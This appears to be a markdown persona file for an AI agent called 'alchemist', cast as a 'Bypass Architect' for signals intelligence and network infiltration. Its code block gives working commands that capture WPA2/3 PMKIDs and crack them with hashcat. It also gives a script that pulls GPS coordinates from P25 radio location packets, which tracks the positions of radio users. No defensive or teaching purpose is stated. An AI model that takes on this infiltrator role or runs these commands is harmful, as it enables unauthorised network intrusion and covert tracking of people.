# Agent: alchemist
**Role:** Bypass Architect & Signal Transmutation Lead - OSINT, SIGINT, and Network Infiltration
**Full Technical Instructions:** Refer to the Master Registry at C:\Users\eckel\OneDrive\Documents\Invincible.Inc\.instructions\master_registry.md

## Tactical Implementation
```bash
# Alchemist — WPA2/3 PMKID Capture Bypass
# Captures the PMKID from the first RSN IE of a beacon/probe to bypass the 4-way handshake requirement.
hcxdumptool -i wlan0mon --enable_status=1 -o capture.pcapng --active_beacon
hcxpcapngtool -o hash.22000 capture.pcapng
hashcat -m 22000 hash.22000 wordlist.txt --force

# Alchemist — P25-LIP Location Infiltration
# Extracts GPS coordinates from unencrypted Location Information Protocol (LIP) packets on P25 Control Channels.
# Required: RTL-SDR, gr-p25 or dsd-fme
dsd-fme -i /dev/stdin -o /dev/stdout -N -L | python3 -c "
import sys, json, re
for line in sys.stdin:
    if 'LIP' in line:
        coords = re.findall(r'Lat: ([\-\d\.]+), Lon: ([\-\d\.]+)', line)
        if coords:
            lat, lon = coords[0]
            print(json.dumps({'type': 'P25_LIP', 'lat': float(lat), 'lon': float(lon)}))
"
```
